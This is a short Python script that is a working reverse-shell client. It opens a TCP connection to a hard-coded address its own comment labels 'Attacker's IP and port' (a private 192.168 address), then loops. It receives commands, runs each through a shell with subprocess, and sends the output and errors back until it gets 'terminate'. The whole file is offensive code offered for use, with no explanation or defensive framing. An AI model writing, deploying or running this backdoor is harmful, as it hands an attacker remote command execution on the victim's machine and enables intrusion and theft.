#!/usr/bin/python3

import socket           # for building TCP connection
import subprocess       # To start SHELL in the system

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("192.168.74.132", 8080))   # Attacker's IP and port
    except Exception as e:
        print("Connection error:", e)
        return

    while True:
        command = s.recv(1024)
        if not command:
            break

        if b"terminate" in command:
            s.close()
            break
        else:
            try:
                CMD = subprocess.Popen(command.decode().strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = CMD.stdout.read()
                error_bytes = CMD.stderr.read()
                s.send(output_bytes)
                s.send(error_bytes)
            except Exception as e:
                print("Command execution error:", e)
                break

def main():
    connect()

if __name__ == "__main__":
    main()
